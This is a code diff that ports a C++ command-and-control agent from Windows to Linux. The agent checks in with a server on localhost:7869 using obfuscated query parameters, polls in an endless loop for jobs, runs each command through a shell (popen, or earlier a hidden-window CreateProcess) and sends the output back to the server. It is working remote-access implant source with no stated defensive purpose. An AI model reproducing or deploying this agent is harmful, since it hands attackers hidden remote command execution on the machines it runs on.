@@ -1,139 +1,186 @@
 #include <iostream>
 #include <string>
-#include <cstdlib>
-#include <cstdio>
+#include <sstream>
+#include <cstring>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <cstring>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdexcept>
+#include <uuid/uuid.h>
 #include <chrono>
-#include <thread>
-#include <windows.h>
-#include <cpprest/http_client.h>
-#include <cpprest/json.h>
+#include <random>
+#include <vector>
 
 using namespace std;
-using namespace web;
-using namespace web::http;
-using namespace web::http::client;
-
-// Default listener I created on web server
-string baseAddress = "http://localhost:7869";
-string agentGuid = to_string(Guid::NewGuid());
-string publicKey = "PUBLICKEY";
 
 class Job
 {
 public:
-    string id;
-    string command;
+    std::string id;
+    std::string command;
 };
 
-http_client client(baseAddress);
+std::string extract_body(const std::string& response) {
+    // Find the end of the headers (double CRLF)
+    size_t pos = response.find("\r\n\r\n");
+    if (pos == std::string::npos) {
+        std::cerr << "Invalid HTTP response: no headers found" << std::endl;
+        return "";
+    }
 
-void Handshake()
-{
-    string request = baseAddress + "/?df2f1f3f7h6h4=n&agentGuid=" + agentGuid;
-    client.request(methods::GET, request).wait();
+    // Extract the body
+    std::string body = response.substr(pos + 4);
+    return body;
 }
 
-task<Job> GetJob()
-{
-    string request = baseAddress + "/?" + to_string(Guid::NewGuid()) + "=n&agentGuid=" + agentGuid;
-    return client.request(methods::GET, request).then([](http_response response)
-    {
-        if (response.status_code() == status_codes::OK)
-        {
-            return response.extract_json();
-        }
 
-        return json::value();
-    }).then([](json::value jsonValue)
-    {
-        return jsonValue.has_field("id") && jsonValue.has_field("command") ? 
-            Job { jsonValue.at("id").as_string(), jsonValue.at("command").as_string() } : 
-            Job { "", "" };
-    });
-}
-
-void CompleteJob(string jobGuid, string jobResponse)
-{
-    string request = baseAddress + "/?df2f1f3f7h9h4=n&jobGuid=" + jobGuid + "&agentGuid=" + agentGuid + "&response=" + jobResponse;
-    client.request(methods::GET, request).wait();
-}
-
-string ExecuteCommand(string command)
-{
-    string response = string("");
-
-    PROCESS_INFORMATION pi;
-    STARTUPINFO si;
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    SECURITY_ATTRIBUTES sa;
-    ZeroMemory(&sa, sizeof(sa));
-    sa.nLength = sizeof(sa);
-    sa.bInheritHandle = TRUE;
-    HANDLE hOutputRead = NULL;
-    HANDLE hOutputWrite = NULL;
-    if (!CreatePipe(&hOutputRead, &hOutputWrite, &sa, 0))
-    {
-        return response;
+string get_request(string host, string path, int port) {
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        cerr << "Error opening socket" << endl;
+        return "";
     }
-    SetHandleInformation(hOutputRead, HANDLE_FLAG_INHERIT, 0);
-    si.hStdOutput = hOutputWrite;
-    si.hStdError = hOutputWrite;
-    PROCESS_INFORMATION processInfo;
-    ZeroMemory(&processInfo, sizeof(processInfo));
-    if (!CreateProcess(NULL, const_cast<LPSTR>(command.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
-    {
-        return response;
+
+    struct addrinfo hints, *result;
+    std::memset(&hints, 0, sizeof(hints));
+    hints.ai_family = AF_UNSPEC;     // allow IPv4 or IPv6
+    hints.ai_socktype = SOCK_STREAM; 
+
+    struct hostent* server = gethostbyname(host.c_str());
+    int addrInfo = getaddrinfo(host.c_str(), "http", &hints, &result);
+    if (addrInfo != 0) {
+        cerr << "Error resolving host" << endl;
+        return "";
     }
-    WaitForSingleObject(pi.hProcess, INFINITE);
-    CloseHandle(hOutputWrite);
-    CHAR buffer[1024];
-    DWORD bytesRead;
-    while (ReadFile(hOutputRead, buffer, sizeof(buffer), &bytesRead, NULL))
-    {
-        response.append(buffer, bytesRead);
+
+    struct sockaddr_in serv_addr;
+    memset(&serv_addr, 0, sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(port);
+    memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);
+
+    if (connect(sockfd, (struct sockaddr*) &serv_addr, sizeof(serv_addr)) < 0) {
+        cerr << "Error connecting to server" << endl;
+        return "";
     }
-    CloseHandle(hOutputRead);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
+
+    stringstream request_stream;
+    request_stream << "GET " << path << " HTTP/1.1\r\n";
+    request_stream << "Host: " << host << "\r\n";
+    request_stream << "Connection: close\r\n";
+    request_stream << "\r\n";
+    string request = request_stream.str();
+
+    if (send(sockfd, request.c_str(), request.length(), 0) < 0) {
+        cerr << "Error sending request" << endl;
+        return "";
+    }
+
+    string response;
+    char buffer[1024];
+    int bytes_received;
+    while ((bytes_received = recv(sockfd, buffer, 1024, 0)) > 0) {
+        response.append(buffer, bytes_received);
+    }
+
+    close(sockfd);
 
     return response;
 }
 
-int main()
-{
-    std::cout << publicKey << std::endl;
+std::string generate_unique_id() {
+    // Use the current time as a seed for the random number generator
+    unsigned seed = std::chrono::system_clock::now().time_since_epoch().count();
+    std::mt19937 generator(seed);
 
-    // Handshake
-    Handshake().wait();
+    // Generate a random 64-bit integer
+    std::uniform_int_distribution<uint64_t> distribution(0, UINT64_MAX);
+    uint64_t random_number = distribution(generator);
 
-    while (true)
-    {
-        try
-        {
-            auto job = GetJob().get();
+    // Convert the random number to a string
+    std::ostringstream oss;
+    oss << std::hex << random_number;
+    std::string unique_id = oss.str();
 
-            if (!job.id.empty())
-            {
-                std::string response = ExecuteCommand(job.command);
-
-                CompleteJob(job.id, response).wait();
-            }
-
-            std::this_thread::sleep_for(std::chrono::seconds(3));
-        }
-        catch (const std::exception& ex)
-        {
-            std::cerr << ex.what() << std::endl;
-        }
-    }
-
-    return 0;
+    // Return the unique ID
+    return unique_id;
 }
 
+std::vector<std::string> split(const std::string& s, char delimiter) {
+    std::vector<std::string> tokens;
+    std::size_t start = 0, end = 0;
+    while ((end = s.find(delimiter, start)) != std::string::npos) {
+        tokens.push_back(s.substr(start, end - start));
+        start = end + 1;
+    }
+    tokens.push_back(s.substr(start));
+    return tokens;
+}
 
+std::string exec(const char* cmd) {
+    char buffer[128];
+    std::string result = "";
+    FILE* pipe = popen(cmd, "r");
+    if (!pipe) throw std::runtime_error("popen() failed!");
+    try {
+        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
+            result += buffer;
+        }
+    } catch (...) {
+        pclose(pipe);
+        throw;
+    }
+    pclose(pipe);
+    return result;
+}
 
+std::string baseAddress = "localhost";
+std::string agentGuid = generate_unique_id();
 
+void handshake() {
+    get_request(baseAddress, "/?df2f1f3f7h6h4=n&agentGuid=" + agentGuid, 7869);
+}
 
+Job getJob() {
+    std::string rsp = extract_body(get_request(baseAddress, "/?df2f1f3f8h6h4=n&agentGuid=" + agentGuid, 7869));
+    std::vector<std::string> tokens = split(rsp, '"');
+    std::string jobGuid = tokens[3];
+    std::string command = tokens[7];
+
+    return {jobGuid, command};
+}
+
+void completeJob(Job j) {
+    std::string rsp = exec(j.command.c_str());
+    get_request(baseAddress, "/?df2f1f3f7h9h4=n&jobGuid=" + j.id + "&agentGuid=" + agentGuid + "&response=" + rsp, 7869);
+}
+
+int main(){
+    sleep(5);
+    handshake();
+    sleep(3);
+    while (true) {
+        Job j = getJob();
+        sleep(2);
+        if (j.id != ""){
+            completeJob(j);
+        }
+        sleep(2);
+    }
+    //std::string response = get_request("localhost", "/?df2f1f3f7h6h4=n&agentGuid=" + agentGuid, 7869);
+    //std::cout<<response<<endl;
+    sleep(2);
+    Job j = getJob();
+    sleep(2);
+    completeJob(j);
+    return 0;
+}
